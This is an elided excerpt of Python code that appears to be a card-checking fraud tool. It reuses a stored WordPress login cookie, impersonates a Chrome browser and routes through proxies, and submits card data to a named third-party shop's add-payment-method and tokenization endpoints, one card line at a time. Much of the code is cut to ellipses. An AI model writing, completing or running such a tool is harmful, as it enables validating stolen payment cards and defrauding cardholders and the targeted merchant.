...
class CookieManager:
    ...
    def save_cookies(self, cookies_data):
        with open('b1.json', "w", encoding="utf-8") as f_coo:
    ...
    def get_cookies(self):
        ...
        return {
            'wordpress_logged_in_55a15683b662ab1778022a13e5e8abc3': oldest_cookie_key
        }
...
class Gateway:
    ...
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        ...
        async with AsyncSession(impersonate="chrome110", proxies=proxies) as session:
            ...
            try:
                headers_get = {
                    "referer": "https://greenmethods.com/my-account/payment-methods/",
                }
                resp_get = await session.get(
                    "https://greenmethods.com/my-account/add-payment-method/",
                    headers=headers_get,
                )
                html = resp_get.text
                ...
                headers_ajax = {
                    ...
                    "referer": "https://greenmethods.com/my-account/add-payment-method/",
                ...
                resp_ajax = await session.post(
                    "https://greenmethods.com/wp-admin/admin-ajax.php",
                ...
                json_tokenize = {
                    "clientSdkMetadata": {
                        "source": "client",
                        "integration": "custom",
                        "sessionId": "f1d089df-594a-4f16-8069-55c8b6cc9587",
                    },
                    "query": (
...
async def process_B3_1(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
